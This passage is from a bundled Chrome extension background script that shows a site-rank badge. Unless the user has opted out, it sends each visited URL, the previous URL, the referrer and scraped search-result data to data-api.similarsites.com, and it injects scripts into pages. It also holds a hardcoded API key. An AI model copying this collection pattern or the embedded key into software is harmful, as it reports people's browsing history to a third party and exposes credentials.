    ct.get(addedTabId, function (tab) {
        if (chrome.runtime.lastError) {} else {
            if (tab.url.indexOf("sourceid=chrome-instant") == -1) {
                fetchPageDataFromSimilarWeb(tab.id, tab);
            }
        }
    });
}

function get_domain_from_url(url) {
    try {
        if (url == null) return '';
        var host = url.split('/');
        if (host.length < 3) return '';
        var domain = host[2];
        if (domain.indexOf("www.") == 0) domain = domain.substr(4);
        return domain;
    } catch (e) {
        return '';
    }
}

function validateUrl(url) {
    return url && url.indexOf("http") === 0 && url.indexOf("://localhost") === -1 && url.indexOf("chrome/newtab") === -1;
}

function toQueryString(obj) {
    return Object.keys(obj).filter(function (key) {
        return !!obj[key] || false === obj[key];
    }).map(function (key) {
        return key + '=' + obj[key];
    }).join('&');
}

function fetchPageDataFromSimilarWeb(tabId, tab) {
    chrome.storage.sync.get("optedout", function (obj) {
        if (obj["optedout"]) {
            setDynamicBadge(0, tabId);
        } else {
            var currTab = getTabWithId(tabId);
            var url = validateUrl(tab.url) ? tab.url : null;
            if (!url) return;
            if (url && !(!currTab.hh && lp == tab.url)) {
                currTab.url = url;

                var srs = "";
                if (currTab.srs) {
                    for (var i = 0; i < currTab.srs.length; i++) {
                        srs += "&sr=" + encodeURIComponent(currTab.srs[i]);
                    }
                }

                var data = {
                    s: itemator, tmv: 3, md: 21, v: "1", sub: version, pid: gid,
                    ts: Date.now(), sess: '', q: encodeURIComponent(currTab.url), prev: encodeURIComponent(lp),
                    hreferer: currTab.ref ? encodeURIComponent(currTab.ref) : "",
                    tt: currTab.tt, tq: currTab.tq, cr: currTab.cr ? encodeURIComponent(currTab.cr) : "", crd: 0
                };

                setTabWithId({ "rp": true, "url": url, hh: currTab.hh || false }, tabId);
                if (tab.active) dolp(tabId);
                var domain = get_domain_from_url(url);

                validatePage(url, tabId).then(function (s) {
                    if (s) {
                        data.ht = encodeURIComponent(JSON.stringify([{
                            type: "serp",
                            data: s
                        }]));
                    }
                    var payload = "e=" + encodeURIComponent(toQueryString(data) + srs) + "&decode=0";
                    fetcher(domain, payload, tabId);
                });
            } else {
                setDynamicBadge(0, tabId);
            }
        }
    });
}

var getAPIDataURL = function getAPIDataURL(url, params, timeout, successCallback, errorCallback) {
    $.ajax({
        url: url,
        data: params || null,
        dataType: "json",
        type: "post",
        timeout: timeout,
        success: successCallback,
        error: errorCallback
    });
};

var fetcher = function fetcher(domain, payload, tabId) {
    if (domain != "") {
        var fetchurl = "https://data-api.similarsites.com/globalrank";
        getAPIDataURL(fetchurl, payload, 30000, function (result) {
            result.Rank = result["global-rank"] || 0;

            if (result["similar-sites"] && result["similar-sites"].length > 0) {
                chrome.tabs.executeScript(tabId, {
                    code: 'window.serp_data =' + JSON.stringify(result["similar-sites"]) + ';'
                }, function () {
                    if (chrome.runtime.lastError) {}
                    (0, _autoInjecting.injectIntoTab)(tabId, ["external/jquery-3.2.1.min.js", "serp/serp.js"], ["serp/serp.css"]);
                });
            }

            setDynamicBadge(result.Rank, tabId);
        });
    }
};

function getApiKey() {
    return "a6fd04d833f2c28ce7c30dc957bf481e";
}

function setDynamicBadge(rank, tId) {
    var imgSuffix = "00";
    if (rank == 0) {
        imgSuffix = "00";
    } else if (rank < 100) imgSuffix = "16";else if (rank < 180) imgSuffix = "15";else if (rank < 320) imgSuffix = "14";else if (rank < 560) imgSuffix = "13";else if (rank < 1000) imgSuffix = "12";else if (rank < 1800) imgSuffix = "11";else if (rank < 3200) imgSuffix = "10";else if (rank < 5600) imgSuffix = "09";else if (rank < 10000) imgSuffix = "08";else if (rank < 18000) imgSuffix = "07";else if (rank < 32000) imgSuffix = "06";else if (rank < 56000) imgSuffix = "05";else if (rank < 100000) imgSuffix = "04";else if (rank < 180000) imgSuffix = "03";else if (rank < 320000) imgSuffix = "02";else if (rank < 560000) imgSuffix = "01";else imgSuffix = "01";
    var img = image_prefix + imgSuffix + ".png";
    var tmpNumber = rank;
    tmpNumber += '';
    var x = tmpNumber.split('.');
    var x1 = x[0];
    var rgx = /(\d+)(\d{3})/;
    while (rgx.test(x1)) {
        x1 = x1.replace(rgx, '$1' + ',' + '$2');
    }

    chrome.tabs.get(tId, function () {
        if (chrome.runtime.lastError) return;

        if (rank == 0 || typeof x1 == "undefined" || x1 == "undefined") {
            cb.setTitle({ title: "Global Rank - N/A", tabId: tId });
        } else {
            cb.setTitle({ title: "Global Rank - #" + x1, tabId: tId });
        }
        cb.setIcon({ path: img, tabId: tId }, function () {
            if (chrome.runtime.lastError) {};
        });
    });
}

/***/ })

/******/ });